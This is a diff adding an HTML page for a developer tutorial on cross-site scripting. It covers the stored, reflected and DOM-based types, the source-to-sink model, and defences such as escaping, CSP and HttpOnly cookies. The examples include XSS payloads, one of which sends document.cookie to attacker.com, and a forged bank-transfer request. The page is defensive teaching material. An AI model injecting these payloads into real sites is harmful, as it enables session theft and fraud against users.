@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Attacks | FullStack</title>
+    <link rel="stylesheet" href="../../../assets/css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <main class="main-content">
+            <section id="section-xss">
+                <h1>👨🏽‍💻 5.2 Security: XSS Attacks (Complete Tutorial for Developers)</h1>
+                <p><strong>How to Understand, Detect, and Prevent Cross-Site Scripting Attacks</strong></p>
+
+                <h2>0️⃣ What Is XSS Really?</h2>
+
+                <p>XSS occurs when data controlled by a user ends up executing as JavaScript in another user's browser.</p>
+
+                <ul>
+                    <li>👉 It's not an attack on the server</li>
+                    <li>👉 It's an attack on the victim's browser</li>
+                    <li>👉 Malicious code executes within your domain context</li>
+                </ul>
+
+                <p><strong>This means malicious script can:</strong></p>
+
+                <ul>
+                    <li>Make authenticated requests on behalf of the user</li>
+                    <li>Read DOM information</li>
+                    <li>Steal tokens if they're in localStorage</li>
+                    <li>Execute actions like transfers, email changes, etc.</li>
+                    <li>Inject phishing within your own app</li>
+                </ul>
+
+                <h2>1️⃣ Why Is It So Dangerous?</h2>
+
+                <p>Because the browser trusts any JavaScript coming from the same origin.</p>
+
+                <p>If the attacker manages to execute code on your domain:</p>
+
+                <pre><code>https://yourbank.com</code></pre>
+
+                <p>The browser treats it as legitimate code from your application.</p>
+
+                <h2>2️⃣ Types of XSS (Very Important)</h2>
+
+                <h3>🟢 1. Stored XSS (Persistent)</h3>
+
+                <p>The payload is saved in the database.</p>
+
+                <p><strong>Attack flow:</strong></p>
+
+                <ol>
+                    <li>Attacker sends a comment with malicious JS</li>
+                    <li>Backend saves it to DB</li>
+                    <li>Another user visits the page</li>
+                    <li>Frontend renders that content as HTML</li>
+                    <li>Browser executes the script</li>
+                </ol>
+
+                <p><strong>Classic example:</strong></p>
+
+                <pre><code>&lt;img src="x" onerror="alert('Hacked')"&gt;</code></pre>
+
+                <h3>🟡 2. Reflected XSS</h3>
+
+                <p>The payload comes in the URL and the server returns it directly in the response.</p>
+
+                <p><strong>Vulnerable example:</strong></p>
+
+                <pre><code>res.send(`&lt;h1&gt;Search: ${req.query.q}&lt;/h1&gt;`);</code></pre>
+
+                <p>If someone visits:</p>
+
+                <pre><code>https://app.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+                <p>It executes.</p>
+
+                <h3>🔵 3. DOM-based XSS</h3>
+
+                <p>Doesn't depend on backend. Frontend manipulates unsafe data.</p>
+
+                <p><strong>Vulnerable code:</strong></p>
+
+                <pre><code>output.innerHTML = location.hash.slice(1);</code></pre>
+
+                <p>If user opens:</p>
+
+                <pre><code>https://app.com/#&lt;img src=x onerror=alert(1)&gt;</code></pre>
+
+                <p>Boom 💥</p>
+
+                <h2>3️⃣ The Correct Mental Model: SOURCE → SINK</h2>
+
+                <p>A senior developer always thinks like this:</p>
+
+                <h3>🔹 SOURCE</h3>
+
+                <p><strong>Where does the data come from?</strong></p>
+
+                <ul>
+                    <li>User input</li>
+                    <li>Query params</li>
+                    <li>Hash</li>
+                    <li>Database</li>
+                    <li>External APIs</li>
+                    <li>localStorage</li>
+                </ul>
+
+                <p><strong>👉 All of that is untrusted.</strong></p>
+
+                <h3>🔹 SINK</h3>
+
+                <p><strong>Where are we inserting it?</strong></p>
+
+                <p><strong>Dangerous sinks:</strong></p>
+
+                <ul>
+                    <li>innerHTML</li>
+                    <li>dangerouslySetInnerHTML</li>
+                    <li>insertAdjacentHTML</li>
+                    <li>document.write</li>
+                    <li>eval()</li>
+                    <li>new Function()</li>
+                    <li>setTimeout("string")</li>
+                </ul>
+
+                <p><strong>The problem is not the input.</strong></p>
+                <p><strong>The problem is interpreting it as HTML/JS.</strong></p>
+
+                <h2>4️⃣ Practical Demo (Stored XSS)</h2>
+
+                <h3>❌ Vulnerable Code</h3>
+
+                <pre><code>fetch("/api/comments")
+  .then(res => res.json())
+  .then(comments => {
+    comments.forEach(comment => {
+      const div = document.createElement("div");
+      div.innerHTML = comment.text; // 🚨 danger
+      container.appendChild(div);
+    });
+  });</code></pre>
+
+                <p>If someone saved this to DB:</p>
+
+                <pre><code>&lt;img src="x" onerror="fetch('https://attacker.com?c='+document.cookie)"&gt;</code></pre>
+
+                <p>It will execute when any user opens the page.</p>
+
+                <h2>5️⃣ The Correct Solution</h2>
+
+                <h3>✅ Option 1 (Recommended): Render as Text</h3>
+
+                <pre><code>div.textContent = comment.text;</code></pre>
+
+                <p>Browser no longer interprets HTML.</p>
+
+                <h3>✅ In React (Secure by Default)</h3>
+
+                <pre><code>&lt;p&gt;{comment}&lt;/p&gt;</code></pre>
+
+                <p>React automatically escapes content.</p>
+
+                <h3>❌ In React (Dangerous)</h3>
+
+                <pre><code>&lt;div dangerouslySetInnerHTML={{ __html: comment }} /&gt;</code></pre>
+
+                <p>Only use if:</p>
+
+                <ul>
+                    <li>You need real HTML</li>
+                    <li>You've sanitized beforehand</li>
+                </ul>
+
+                <h2>6️⃣ Escaping vs Sanitizing (Key Concept)</h2>
+
+                <h3>🔹 Escaping (Encoding)</h3>
+
+                <p>Converts &lt;script&gt; into literal text.</p>
+
+                <ul>
+                    <li>✔️ It's the safest option</li>
+                    <li>✔️ It's what React does by default</li>
+                </ul>
+
+                <h3>🔹 Sanitizing</h3>
+
+                <p>You allow some tags and remove others.</p>
+
+                <p><strong>Example:</strong></p>
+
+                <ul>
+                    <li>Allow &lt;b&gt;, &lt;i&gt;, &lt;a&gt;</li>
+                    <li>Remove &lt;script&gt;, onload, onclick, javascript: etc.</li>
+                </ul>
+
+                <p><strong>⚠️ Only if you need rich HTML.</strong></p>
+
+                <p><strong>Senior rule:</strong></p>
+
+                <p>Never accept HTML if you don't need it.</p>
+
+                <h2>7️⃣ Defense in Depth (Layers of Protection)</h2>
+
+                <p>A senior never depends on a single defense.</p>
+
+                <h3>🛡 1. HttpOnly Cookies</h3>
+
+                <p>Prevents JS from accessing session cookies.</p>
+
+                <pre><code>Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict</code></pre>
+
+                <p>If there's XSS, they can't do:</p>
+
+                <pre><code>document.cookie</code></pre>
+
+                <h3>🛡 2. Content Security Policy (CSP)</h3>
+
+                <p><strong>Example:</strong></p>
+
+                <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self';</code></pre>
+
+                <p>Blocks inline scripts.</p>
+
+                <h3>🛡 3. Don't Use LocalStorage for Sensitive Tokens</h3>
+
+                <p>If there's XSS:</p>
+
+                <ul>
+                    <li>LocalStorage is accessible</li>
+                    <li>HttpOnly Cookies are not</li>
+                </ul>
+
+                <h3>🛡 4. Backend Validation</h3>
+
+                <p>Even if frontend escapes, backend should validate.</p>
+
+                <h2>8️⃣ Professional Anti-XSS Checklist</h2>
+
+                <p>When reviewing an app:</p>
+
+                <ul>
+                    <li>✅ Is there innerHTML?</li>
+                    <li>✅ Is there dangerouslySetInnerHTML?</li>
+                    <li>✅ Are eval or new Function used?</li>
+                    <li>✅ Is DB content rendered as HTML?</li>
+                    <li>✅ Tokens in LocalStorage?</li>
+                    <li>✅ HttpOnly Cookies?</li>
+                    <li>✅ Is CSP enabled?</li>
+                    <li>✅ Tests with malicious payloads?</li>
+                </ul>
+
+                <h2>9️⃣ Real Case: What Can an Attacker Do?</h2>
+
+                <p>Imagine a banking app:</p>
+
+                <pre><code>fetch('/api/transfer', {
+  method: 'POST',
+  body: JSON.stringify({
+    amount: 5000,
+    to: 'attacker-account'
+  })
+});</code></pre>
+
+                <p>If the user is authenticated,</p>
+                <p>the browser will automatically send session cookies.</p>
+                <p>Backend thinks it was the legitimate user.</p>
+
+                <h2>🔟 Summary to Remember</h2>
+
+                <p><strong>XSS is NOT:</strong></p>
+
+                <p>"Someone hacked the server"</p>
+
+                <p><strong>XSS IS:</strong></p>
+
+                <p>"Someone made the victim's browser execute malicious code under your domain"</p>
+
+                <p><strong>And that's extremely powerful.</strong></p>
+
+                <h2>1️⃣1️⃣ Typical Interview Questions (With Answers)</h2>
+
+                <h3>❓ What is XSS?</h3>
+
+                <p>It's the execution of malicious JavaScript in the victim's browser due to improper validation or rendering of untrusted data.</p>
+
+                <h3>❓ Difference Between Stored and Reflected XSS</h3>
+
+                <p>Stored is saved in the database.<br>
+                Reflected comes in the request and is returned immediately.</p>
+
+                <h3>❓ Why Is React More Secure by Default?</h3>
+
+                <p>Because it automatically escapes interpolated content.</p>
+
+                <h3>❓ Why Is LocalStorage Dangerous Against XSS?</h3>
+
+                <p>Because any script can read it.</p>
+
+                <h3>❓ How Would You Mitigate XSS in a Real App?</h3>
+
+                <p>Don't use innerHTML<br>
+                Escape output<br>
+                Sanitize if I need HTML<br>
+                HttpOnly Cookies<br>
+                CSP<br>
+                Backend validation</p>
+
+                <h2>1️⃣2️⃣ Senior Mindset</h2>
+
+                <ul>
+                    <li>Never trust external data</li>
+                    <li>Never interpret strings as code</li>
+                    <li>Always think in terms of: SOURCE → TRANSFORMATION → SINK</li>
+                    <li>If something can reach the DOM as HTML, assume it can become code execution</li>
+                    <li>If you want to keep users safe, don't use innerHTML with untrusted data</li>
+                </ul>
+
+                <h2>1️⃣3️⃣ One Phrase to Remember</h2>
+
+                <p><strong>"XSS is when the browser executes untrusted code as if it were legitimate. Never interpret external data as HTML or JavaScript. Always escape, rarely sanitize."</strong></p>
+
+                <h2>1️⃣4️⃣ References and Resources</h2>
+
+                <p><strong>To learn more:</strong></p>
+
+                <ul>
+                    <li><a href="https://chatgpt.com/g/g-p-69925f6597e88191b8bcb93447c5bb78-dragos/c/6994efaf-8c3c-8394-afaa-0fcb83244f2b" target="_blank">Dragos - Advanced XSS & Web Security Patterns</a></li>
+                </ul>
+
+                <div class="navigation-buttons">
+                    <button class="btn btn-secondary" onclick="window.location.href='11-sql-injection.html'">← Previous</button>
+                    <button class="btn btn-primary" onclick="window.location.href='../../../index.html'">Back to Home →</button>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <script src="../../../assets/js/app.js"></script>
+</body>
+</html>
